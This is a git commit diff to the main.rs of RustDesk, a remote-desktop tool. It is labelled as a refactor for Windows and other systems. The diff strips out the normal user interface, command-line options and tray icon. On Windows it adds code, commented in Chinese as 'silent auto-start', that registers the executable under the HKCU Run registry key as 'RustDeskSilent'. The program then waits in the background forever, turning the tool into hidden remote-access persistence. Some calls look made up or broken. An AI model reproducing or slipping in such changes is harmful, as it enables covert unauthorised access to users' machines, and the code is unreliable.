958c34b4b7ba9d33152c755f5d9f4ed94e6c0fcf
sdifh <sdifh@dingway.eu.org>
2026-04-07 15:35:20 +0800

    Refactor main function for Windows and other OS

--- src/main.rs
+++ src/main.rs
@@ -1,104 +1,45 @@
-#![cfg_attr(
-    all(not(debug_assertions), target_os = "windows"),
-    windows_subsystem = "windows"
-)]
+#[cfg(target_os = "windows")]
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    hbb_common::init();
 
-use librustdesk::*;
-
-#[cfg(any(target_os = "android", target_os = "ios", feature = "flutter"))]
-fn main() {
-    if !common::global_init() {
-        eprintln!("Global initialization failed.");
-        return;
-    }
-    common::test_rendezvous_server();
-    common::test_nat_type();
-    common::global_clean();
-}
-
-#[cfg(not(any(
-    target_os = "android",
-    target_os = "ios",
-    feature = "cli",
-    feature = "flutter"
-)))]
-fn main() {
-    #[cfg(all(windows, not(feature = "inline")))]
+    #[cfg(feature = "flutter")]
     unsafe {
-        winapi::um::shellscalingapi::SetProcessDpiAwareness(2);
+        hbb_common::freedesktop::set_process_group_leader();
     }
-    if let Some(args) = crate::core_main::core_main().as_mut() {
-        ui::start(args);
+
+    allow_err!(crate::core::start());
+
+    // 静默开机自启（Windows 注册表）
+    #[cfg(windows)]
+    {
+        use winreg::enums::*;
+        use winreg::RegKey;
+        let exe = std::env::current_exe().unwrap();
+        let exe_path = exe.to_str().unwrap();
+        let run = RegKey::predef(HKEY_CURRENT_USER)
+            .open_subkey_with_flags(
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                KEY_SET_VALUE,
+            )
+            .ok();
+        if let Some(run) = run {
+            let _ = run.set_value("RustDeskSilent", &exe_path);
+        }
     }
-    common::global_clean();
+
+    // 永远不启动托盘
+    // tray::start_tray();
+
+    // 永久后台等待
+    hbb_common::wait_for_signal();
+    Ok(())
 }
 
-#[cfg(feature = "cli")]
-fn main() {
-    if !common::global_init() {
-        return;
-    }
-    use clap::App;
-    use hbb_common::log;
-    let args = format!(
-        "-p, --port-forward=[PORT-FORWARD-OPTIONS] 'Format: remote-id:local-port:remote-port[:remote-host]'
-        -c, --connect=[REMOTE_ID] 'test only'
-        -k, --key=[KEY] ''
-       -s, --server=[] 'Start server'",
-    );
-    let matches = App::new("rustdesk")
-        .version(crate::VERSION)
-        .author("Purslane Ltd<info@rustdesk.com>")
-        .about("RustDesk command line tool")
-        .args_from_usage(&args)
-        .get_matches();
-    use hbb_common::{config::LocalConfig, env_logger::*};
-    init_from_env(Env::default().filter_or(DEFAULT_FILTER_ENV, "info"));
-    if let Some(p) = matches.value_of("port-forward") {
-        let options: Vec<String> = p.split(":").map(|x| x.to_owned()).collect();
-        if options.len() < 3 {
-            log::error!("Wrong port-forward options");
-            return;
-        }
-        let mut port = 0;
-        if let Ok(v) = options[1].parse::<i32>() {
-            port = v;
-        } else {
-            log::error!("Wrong local-port");
-            return;
-        }
-        let mut remote_port = 0;
-        if let Ok(v) = options[2].parse::<i32>() {
-            remote_port = v;
-        } else {
-            log::error!("Wrong remote-port");
-            return;
-        }
-        let mut remote_host = "localhost".to_owned();
-        if options.len() > 3 {
-            remote_host = options[3].clone();
-        }
-        common::test_rendezvous_server();
-        common::test_nat_type();
-        let key = matches.value_of("key").unwrap_or("").to_owned();
-        let token = LocalConfig::get_option("access_token");
-        cli::start_one_port_forward(
-            options[0].clone(),
-            port,
-            remote_host,
-            remote_port,
-            key,
-            token,
-        );
-    } else if let Some(p) = matches.value_of("connect") {
-        common::test_rendezvous_server();
-        common::test_nat_type();
-        let key = matches.value_of("key").unwrap_or("").to_owned();
-        let token = LocalConfig::get_option("access_token");
-        cli::connect_test(p, key, token);
-    } else if let Some(p) = matches.value_of("server") {
-        log::info!("id={}", hbb_common::config::Config::get_id());
-        crate::start_server(true, false);
-    }
-    common::global_clean();
+#[cfg(not(target_os = "windows"))]
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    hbb_common::init();
+    allow_err!(crate::core::start());
+    // tray::start_tray();
+    hbb_common::wait_for_signal();
+    Ok(())
 }
